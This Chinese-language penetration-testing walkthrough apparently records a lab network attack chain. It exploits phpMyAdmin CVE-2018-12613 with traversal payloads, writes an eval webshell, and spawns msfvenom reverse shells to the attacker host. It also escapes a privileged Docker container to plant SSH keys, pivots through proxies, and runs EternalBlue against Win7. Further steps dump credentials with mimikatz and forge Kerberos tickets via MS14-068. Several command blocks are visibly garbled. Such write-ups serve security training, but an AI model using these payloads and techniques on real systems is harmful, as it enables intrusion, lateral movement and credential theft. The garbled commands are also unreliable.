## phpmyadmin Getshell

访问对应端口，发现都不需要输入密码直接进去了，那么这里方式就比较多了，提供的思路为使用CVE-2018-12613,漏洞网上已经有师傅分析了，这里就复现一波，具体分析文章为：http://sunu11.com/2018/07/25/22/

![](../Images/c5ef55fd894bf851c7ce0965caeb8cff.png)

这时一个远程文件包含漏洞，验证payload为：

```

http://192.168.1.108:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
```

![](../Images/3a772f302d369d176bbcde6e3228751d.png)

可以看到读取了passwd的内容，证明漏洞存在。

这里getshell就可以通过包含session临时文件来实现命令执行 执行一个`SELECT '<?php phpinfo(); ?>'` 命令然后查看session值来访问临时文件。

![](../Images/4ea44972f273d1b0e794067ad13624be.png)

执行成功后，查看自己的sessionid，phpMyadmin的值。

![](../Images/b1eb0860c22cafcadb7e6b9c477d130b.png)

复制该值，把值带到sess\_,直接访问:

```

http://192.168.1.108:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_0b63245d88cef3d904fa32778f96120e
```

![](../Images/ee8e0038d0e7a164be83e203abb007dd.png)

既然可以RCE，那么这里如何上传webshell呢。构造sql语句如下：

```
select "<?php file_put_contents('/var/www/html/cmd.php','<?php @eval($_POST[pass]);?>')?>"

```

![](../Images/8d3954bc372a027aa17a31a9addb5896.png)

同样的方法找到sessionid，phpMyadmin的值。

访问：

```

http://192.168.1.108:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_c4056d4984f0aab2e94bc7ddf6ee1a45
```

![](../Images/96d7994a50f90563c369781c35cbbb69.png)

再访问cmd.php，发现成功写入了。

![](../Images/82c34365c81e453f5eb7c3bbc658fb43.png)

## 内网渗透

回到phpmyadmin这个shell。想上线cs方便操作，发现他是liunx:

![](../Images/4dd9fa9a0ffdc2a9e2a0ad1dfcfa05b5.png)

cs是不自带liunx的上线方式的，但这里还是想上线，使用CrossC2插件上线。

这里如何配置网上的教程已经有很多了，生成一个命令行式的一句话，curl上线。

![](../Images/2a6da7a08fc7aa6306f10da66288baae.png)

但是这里出现了小插曲，可能由于是docker的原因，这里并没有成功上线，更换了webshell工具也是不行的，测试本机都是可以的。

![](../Images/d638e2adc7f0b62bf1c4475a6fe79263.png)

那么这里只好试试msf，生成elf文件：

```

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=4444 -f elf > shell.elf
```

生成elf文件后上传到web根目录下，并chmod命令修改权限为777。

![](../Images/faaa1ead3d8c2a9e7fce831d8901ab32.png)

msf准备接受会话

```

use exploit/multi/handlerset
 payload linux/x86/meterpreter/reverse_tcpset
 lhost 192.168.1.128set

 lport 4444
```

然后执行`shell.elf`，成功接收到会话。

![](../Images/cda456e80d904aa04f865bf55e15be19.png)

### docker逃逸

这里的逃逸方法为privileged特权。特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行`docker run —privileged`时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。

此外还可以通过写入计划任务等方式在宿主机执行命令。那么这里就可以尝试使用特权模式写入ssh私钥，使用ssh登录。

查看磁盘文件：fdisk -l

![](../Images/bbfea20cbe420a6be8d679947849b30b.png)

可以看到是在/dev目录下：`ls /dev`

![](../Images/f8182c7d95a2ed4c1726486bc0391db4.png)

创建一个目录test，将/dev/sda1挂载到新建的目录下

```
mkdir /test
test

```

已经可以访问宿主机上的目录内容了。

![](../Images/34d659068a92f2c053a3e8f04cb1d70e.png)

然后使用ssh生成一个私钥，用chmod命令赋予权限。

```
ssh-keygen -f test
test

```

![](../Images/2f3311e42f7562da0d79a7e62d5fd88e.png)

这里桌面会生成一个`test.pub`

`ls /test/home`即可查看目标机器的用户都有哪些

![](../Images/9ed0b04944744c81a3ae13479cc32fbf.png)

进入到ubuntu用户，里面会存在.ssh目录，我们需要将密钥写入.ssh目录并将文件命名为authorized\_keys（目标机.ssh目录权限必须为700）。依次执行以下两条命令写入密钥文件。

```
cp -avx /test/home/ubuntu/.ssh/id_rsa.pub/test
/home/ubuntu/.ssh/authorized_keysecho '生成的.pub文件的内容' >/test
/home/ubuntu/.ssh/authorized_keys
```

![](../Images/b5d1c3cc5bd7c751975eb747adebec70.png)

再使用ssh去连接`ssh -i test ubuntu@192.168.1.108`

![](../Images/e3b984a55d9957adb979edbd3ac1de84.png)

这里有个隐藏buff就是历史命令未删除问题，跟接下来拿win7有关系。使用命令`history`

![](../Images/42ee19471f721c3390f2b62b894c81d9.png)

### liunx系统上线cs

这下应该可以上线cs了吧，还是刚刚的套路，通过curl无文件上线，成功上线。

![](../Images/cffd85aa16deb438f9632e141a0f0933.png)

查看网卡信息时发现除了刚刚的一些混淆的docker ip外，有另外一张网卡。

![](../Images/bce4bea734bbb73d4251d75290168c30.png)

这里就准备扫一下。因为没有自带的端口扫描，上传一个fscan去扫一下：

```

shell /home/ubuntu/fscan_amd64 -h 192.168.183.1/24
```

![](../Images/62af1a6ca05d60b57d66f034b2f8767f.png)

发现有同网段主机一台win7，并且有永恒之蓝的漏洞。这里就想要利用永恒之蓝，cs在liunx上的功能还是比较缺失的，这里还是先用msf打一波。

通过上传elf文件再执行，得到shell反弹回msf，然后添加路由：

```

route add 192.168.183.0 255.255.255.0 4print

```

![](../Images/32b42a662ccef33203aff68a08327f24.png)

```

use auxiliary/server/socks_proxyset

 version 4a
```

修改proxychains4.conf

![](../Images/fc317fa2eb65d06bccdb158573cb839b.png)

使用永恒之蓝模块去打：

```

use exploit/windows/smb/ms17_010_eternalblueset
 payload windows/x64/meterpreter/bind_tcpset

 rhosts 192.168.183.140
```

![](../Images/64851d3c09faa41e0260384c635deefb.png)

这里直接上线了，执行命令后发现是有域的。

![](../Images/6131c90d80d21f0b7101352a4141998a.png)![](../Images/6a3dae43a4128ab42d15832522ddae5f.png)

通过nslookup查询迅速确定域控ip：192.168.183.130

![](../Images/91a2d07e51e074b22117c29762748b24.png)

域控出来了，思路就明确了。这里还是想先上线cs方便操作。由于CrossC2提供的功能较少，选择做代理，将cs带入到内网。

使用Venom+Proxifier，上传agent到边缘机器。

https://github.com/m0hithreddy/Proxifier-For-Linux

![](../Images/4b43cea34d7f010aa369599848a92f3d.png)

边缘机器执行命令：

```

shell /home/ubuntu//Desktop/agent_linux_x86 -rhost 192.168.1.128 -rport 9999
```

![](../Images/74cb651a9af11330da5b43a8533b6dfc.png)

配置Proxifier.conf文件

![](../Images/ae0fe88ec797bf8b108682fc205e06cb.png)

启动Proxifier后发现已经可以通向内网机器win7。

```

sudo systemctl start proxifier
```

![](../Images/52189a007c4d93ee3aeea6a0d56dfa49.png)

这里可以中继或者使用tcp beacon。但是两个我都没有成功，cross c2在高版本的cs下的功能还是弱了点，就放弃了。

### win7信息收集

拿到内网一台主机，首先就想抓他的密码，加上这台主机是win7，是可以直接抓取到明文密码的。这里已经上传了一个mimikatz，直接利用。

![](../Images/5e869cdc9add6c3b0563efb44f3d6605.png)

```


privilege::debug
```

win7抓取密码就比较轻松了，这里也是直接抓到明文。也跟上面历史命令相呼应。

![](../Images/04623b658a3b0b6b2343381cc7a12254.png)

浏览器密码等也是可以翻一下的，比较该主机已经在域内了，很多信息可能对我们拿下域控很有帮助。补丁还是打了不少，不过由于操作系统有点老了，总都会有些洞，经过对比发现ms14-068的补丁并没有安装，是可以利用的。

![](../Images/55e4218a0df40cacf42c2c7310d41401.png)

通过mimikatz抓取，获得了域内用户douser的sid和明文密码，并且知道域名称等信息，使用工具直接利用。

```

ms14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123
```

![](../Images/17e29d950a1e88754476c18fee70d431.png)

注入票据，注入后通过klist查看已经有了票据。

```
mimikatz # kerberos::list          //查看当前机器凭证
# kerberos::ptc TGT_douser@DEMO.com.ccache   //将票据注入

```

![](../Images/19fc587e751c8b7c5a6653b77197f7ee.png)

通过ipc连接或者dir可以直接访问域控机器，抓取密码的信息中已经有了域控机器名。

![](../Images/cd7d461bd7a920989d9e0ea52d26ce4c.png)
